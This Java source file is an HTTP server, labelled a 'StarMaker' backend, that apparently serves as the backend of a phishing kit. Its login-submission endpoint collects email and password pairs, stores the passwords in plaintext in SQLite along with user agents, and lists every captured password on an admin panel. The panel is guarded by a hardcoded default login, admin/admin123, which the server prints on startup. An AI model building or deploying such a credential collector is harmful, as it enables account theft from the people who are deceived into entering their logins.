import com.sun.net.httpserver.Headers;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpServer;

import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.security.SecureRandom;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.time.Instant;
import java.util.ArrayList;
import java.util.Collections;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.Executors;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class JavaBackend {
    private static final Path ROOT = Path.of("").toAbsolutePath();
    private static final Path DATA_DIR = resolveDataDir();
    private static final Path SUBMISSIONS_FILE = DATA_DIR.resolve("submissions.json");
    private static final Path DATABASE_FILE = DATA_DIR.resolve("submissions.db");
    private static final String DATABASE_URL = "jdbc:sqlite:" + DATABASE_FILE;
    private static final String ADMIN_USERNAME = envOrDefault("ADMIN_USERNAME", "admin");
    private static final String ADMIN_PASSWORD = envOrDefault("ADMIN_PASSWORD", "admin123");
    private static final Set<String> SESSIONS = Collections.synchronizedSet(new HashSet<>());
    private static final SecureRandom RANDOM = new SecureRandom();

    public static void main(String[] args) throws IOException {
        initializeDatabase();

        int port = Integer.parseInt(envOrDefault("PORT", "3000"));
        HttpServer server = HttpServer.create(new InetSocketAddress(port), 0);
        server.createContext("/api/login-submissions", JavaBackend::handleLoginSubmission);
        server.createContext("/api/admin/login", JavaBackend::handleAdminLogin);
        server.createContext("/api/admin/logout", JavaBackend::handleAdminLogout);
        server.createContext("/api/admin/submissions", JavaBackend::handleAdminSubmissions);
        server.createContext("/healthz", JavaBackend::handleHealthCheck);
        server.createContext("/", JavaBackend::handleStaticFile);
        server.setExecutor(Executors.newCachedThreadPool());
        server.start();
        System.out.println("StarMaker Java backend running at http://localhost:" + port);
        System.out.println("Admin panel available at http://localhost:" + port + "/admin.html");
        System.out.println("Default admin login: " + ADMIN_USERNAME + " / " + ADMIN_PASSWORD);
    }

    private static void handleHealthCheck(HttpExchange exchange) throws IOException {
        sendJson(exchange, 200, "{\"status\":\"ok\"}");
    }

    private static void handleLoginSubmission(HttpExchange exchange) throws IOException {
        if (!"POST".equalsIgnoreCase(exchange.getRequestMethod())) {
            sendJson(exchange, 405, "{\"message\":\"Method not allowed.\"}");
            return;
        }

        Map<String, String> body = parseJsonObject(readBody(exchange));
        String email = body.getOrDefault("email", "").trim();
        String password = body.getOrDefault("password", "");

        if (email.isEmpty() || password.isEmpty()) {
            sendJson(exchange, 400, "{\"message\":\"Email and password are required.\"}");
            return;
        }

        String userAgent = exchange.getRequestHeaders().getFirst("User-Agent") == null ? "" : exchange.getRequestHeaders().getFirst("User-Agent");

        try {
            saveSubmission(email, password, Instant.now().toString(), userAgent);
            sendJson(exchange, 201, "{\"message\":\"Submission saved.\"}");
        } catch (SQLException error) {
            error.printStackTrace();
            sendJson(exchange, 500, "{\"message\":\"Unable to save submission.\"}");
        }
    }

    private static void handleAdminLogin(HttpExchange exchange) throws IOException {
        if (!"POST".equalsIgnoreCase(exchange.getRequestMethod())) {
            sendJson(exchange, 405, "{\"message\":\"Method not allowed.\"}");
            return;
        }

        Map<String, String> body = parseJsonObject(readBody(exchange));
        String username = body.getOrDefault("username", "");
        String password = body.getOrDefault("password", "");

        if (!ADMIN_USERNAME.equals(username) || !ADMIN_PASSWORD.equals(password)) {
            sendJson(exchange, 401, "{\"message\":\"Invalid admin username or password.\"}");
            return;
        }

        String token = randomToken();
        SESSIONS.add(token);
        exchange.getResponseHeaders().add("Set-Cookie", "adminToken=" + token + "; HttpOnly; SameSite=Strict; Path=/; Max-Age=28800");
        sendJson(exchange, 200, "{\"message\":\"Logged in.\"}");
    }

    private static void handleAdminLogout(HttpExchange exchange) throws IOException {
        if (!isAdmin(exchange)) {
            sendJson(exchange, 401, "{\"message\":\"Admin login required.\"}");
            return;
        }

        String token = cookies(exchange).get("adminToken");
        SESSIONS.remove(token);
        exchange.getResponseHeaders().add("Set-Cookie", "adminToken=; HttpOnly; SameSite=Strict; Path=/; Max-Age=0");
        sendJson(exchange, 200, "{\"message\":\"Logged out.\"}");
    }

    private static void handleAdminSubmissions(HttpExchange exchange) throws IOException {
        if (!isAdmin(exchange)) {
            sendJson(exchange, 401, "{\"message\":\"Admin login required.\"}");
            return;
        }

        List<Map<String, String>> submissions;
        try {
            submissions = readSubmissions();
        } catch (SQLException error) {
            error.printStackTrace();
            sendJson(exchange, 500, "{\"message\":\"Unable to load submissions.\"}");
            return;
        }

        StringBuilder json = new StringBuilder("{\"submissions\":[");
        for (Map<String, String> submission : submissions) {
            if (json.charAt(json.length() - 1) != '[') {
                json.append(',');
            }
                String pw = submission.getOrDefault("password", "");
                String pwStatus = !pw.isEmpty() ? "Stored as plaintext" : "Not stored";
            json.append('{')
                    .append("\"id\":").append(submission.getOrDefault("id", "0")).append(',')
                    .append("\"email\":\"").append(escapeJson(submission.getOrDefault("email", ""))).append("\",")
                    .append("\"submittedAt\":\"").append(escapeJson(submission.getOrDefault("submittedAt", ""))).append("\",")
                    .append("\"userAgent\":\"").append(escapeJson(submission.getOrDefault("userAgent", ""))).append("\",")
                    .append("\"password\":\"").append(escapeJson(pw)).append("\",")
                    .append("\"passwordStatus\":\"").append(escapeJson(pwStatus)).append("\"")
                    .append('}');
        }
        json.append("]}");
        sendJson(exchange, 200, json.toString());
    }

    private static void handleStaticFile(HttpExchange exchange) throws IOException {
        String requestPath = URLDecoder.decode(exchange.getRequestURI().getPath(), StandardCharsets.UTF_8);
        if ("/".equals(requestPath)) {
            requestPath = "/index.html";
        }

        Path file = ROOT.resolve(requestPath.substring(1)).normalize();
        if (!file.startsWith(ROOT) || Files.isDirectory(file) || !Files.exists(file)) {
            sendText(exchange, 404, "Not found", "text/plain");
            return;
        }

        byte[] bytes = Files.readAllBytes(file);
        exchange.getResponseHeaders().set("Content-Type", contentType(file));
        exchange.sendResponseHeaders(200, bytes.length);
        try (OutputStream output = exchange.getResponseBody()) {
            output.write(bytes);
        }
    }

    private static void initializeDatabase() throws IOException {
        Files.createDirectories(DATA_DIR);
        try {
            Class.forName("org.sqlite.JDBC");
            try (Connection connection = openDatabase();
                 Statement statement = connection.createStatement()) {
                statement.executeUpdate("""
                        CREATE TABLE IF NOT EXISTS submissions (
                            id INTEGER PRIMARY KEY AUTOINCREMENT,
                            email TEXT NOT NULL,
                            password TEXT NOT NULL,
                            submitted_at TEXT NOT NULL,
                            user_agent TEXT NOT NULL
                        )
                        """);
            }
            migrateJsonSubmissions();
        } catch (ClassNotFoundException error) {
            throw new IOException("SQLite JDBC driver is missing. Add sqlite-jdbc to the classpath.", error);
        } catch (SQLException error) {
            throw new IOException("Unable to initialize SQLite database.", error);
        }
    }

    private static Connection openDatabase() throws SQLException {
        return DriverManager.getConnection(DATABASE_URL);
    }

    private static void saveSubmission(String email, String password, String submittedAt, String userAgent) throws SQLException {
        String sql = "INSERT INTO submissions (email, password, submitted_at, user_agent) VALUES (?, ?, ?, ?)";
        try (Connection connection = openDatabase();
             PreparedStatement statement = connection.prepareStatement(sql)) {
            statement.setString(1, email);
            statement.setString(2, password);
            statement.setString(3, submittedAt);
            statement.setString(4, userAgent);
            statement.executeUpdate();
        }
    }

    private static List<Map<String, String>> readSubmissions() throws SQLException {
        List<Map<String, String>> submissions = new ArrayList<>();
        String sql = "SELECT id, email, password, submitted_at, user_agent FROM submissions ORDER BY id DESC";
        try (Connection connection = openDatabase();
             PreparedStatement statement = connection.prepareStatement(sql);
             ResultSet result = statement.executeQuery()) {
            while (result.next()) {
                Map<String, String> entry = new HashMap<>();
                entry.put("id", String.valueOf(result.getInt("id")));
                entry.put("email", result.getString("email"));
                entry.put("password", result.getString("password"));
                entry.put("submittedAt", result.getString("submitted_at"));
                entry.put("userAgent", result.getString("user_agent"));
                submissions.add(entry);
            }
        }
        return submissions;
    }

    private static void migrateJsonSubmissions() throws IOException, SQLException {
        if (!Files.exists(SUBMISSIONS_FILE) || countSubmissions() > 0) {
            return;
        }

        String json = Files.readString(SUBMISSIONS_FILE);
        Matcher objectMatcher = Pattern.compile("\\{([^{}]*)}").matcher(json);
        while (objectMatcher.find()) {
            Map<String, String> entry = parseJsonObject("{" + objectMatcher.group(1) + "}");
            String email = entry.getOrDefault("email", "").trim();
            String password = entry.getOrDefault("password", "");
            if (!email.isEmpty() && !password.isEmpty()) {
                saveSubmission(
                        email,
                        password,
                        entry.getOrDefault("submittedAt", Instant.now().toString()),
                        entry.getOrDefault("userAgent", "")
                );
            }
        }
    }

    private static int countSubmissions() throws SQLException {
        try (Connection connection = openDatabase();
             PreparedStatement statement = connection.prepareStatement("SELECT COUNT(*) FROM submissions");
             ResultSet result = statement.executeQuery()) {
            return result.next() ? result.getInt(1) : 0;
        }
    }

    private static Map<String, String> parseJsonObject(String json) {
        Map<String, String> result = new HashMap<>();
        Matcher matcher = Pattern.compile("\"([^\"\\\\]*(?:\\\\.[^\"\\\\]*)*)\"\\s*:\\s*\"([^\"\\\\]*(?:\\\\.[^\"\\\\]*)*)\"").matcher(json);
        while (matcher.find()) {
            result.put(unescapeJson(matcher.group(1)), unescapeJson(matcher.group(2)));
        }
        return result;
    }

    private static String readBody(HttpExchange exchange) throws IOException {
        return new String(exchange.getRequestBody().readAllBytes(), StandardCharsets.UTF_8);
    }

    private static boolean isAdmin(HttpExchange exchange) {
        String token = cookies(exchange).get("adminToken");
        return token != null && SESSIONS.contains(token);
    }

    private static Map<String, String> cookies(HttpExchange exchange) {
        Map<String, String> result = new HashMap<>();
        List<String> cookieHeaders = exchange.getRequestHeaders().getOrDefault("Cookie", List.of());
        for (String header : cookieHeaders) {
            for (String cookie : header.split(";")) {
                String[] parts = cookie.trim().split("=", 2);
                if (parts.length == 2) {
                    result.put(parts[0], parts[1]);
                }
            }
        }
        return result;
    }

    private static String contentType(Path file) {
        String name = file.getFileName().toString().toLowerCase();
        if (name.endsWith(".html")) return "text/html; charset=utf-8";
        if (name.endsWith(".css")) return "text/css; charset=utf-8";
        if (name.endsWith(".js")) return "application/javascript; charset=utf-8";
        if (name.endsWith(".svg")) return "image/svg+xml";
        if (name.endsWith(".json")) return "application/json; charset=utf-8";
        if (name.endsWith(".png")) return "image/png";
        if (name.endsWith(".jpg") || name.endsWith(".jpeg")) return "image/jpeg";
        return "application/octet-stream";
    }

    private static void sendJson(HttpExchange exchange, int status, String json) throws IOException {
        sendText(exchange, status, json, "application/json; charset=utf-8");
    }

    private static void sendText(HttpExchange exchange, int status, String text, String contentType) throws IOException {
        Headers headers = exchange.getResponseHeaders();
        headers.set("Content-Type", contentType);
        byte[] bytes = text.getBytes(StandardCharsets.UTF_8);
        exchange.sendResponseHeaders(status, bytes.length);
        try (OutputStream output = exchange.getResponseBody()) {
            output.write(bytes);
        }
    }

    private static String randomToken() {
        byte[] bytes = new byte[32];
        RANDOM.nextBytes(bytes);
        StringBuilder token = new StringBuilder();
        for (byte b : bytes) {
            token.append(String.format("%02x", b));
        }
        return token.toString();
    }

    private static String escapeJson(String value) {
        return value
                .replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\n", "\\n")
                .replace("\r", "\\r")
                .replace("\t", "\\t");
    }

    private static String unescapeJson(String value) {
        return value
                .replace("\\\"", "\"")
                .replace("\\\\", "\\")
                .replace("\\n", "\n")
                .replace("\\r", "\r")
                .replace("\\t", "\t");
    }

    private static String envOrDefault(String name, String fallback) {
        String value = System.getenv(name);
        return value == null || value.isBlank() ? fallback : value;
    }

    private static Path resolveDataDir() {
        String configured = System.getenv("DATA_DIR");
        if (configured != null && !configured.isBlank()) {
            return Path.of(configured).toAbsolutePath().normalize();
        }
        return ROOT.resolve("data");
    }
}
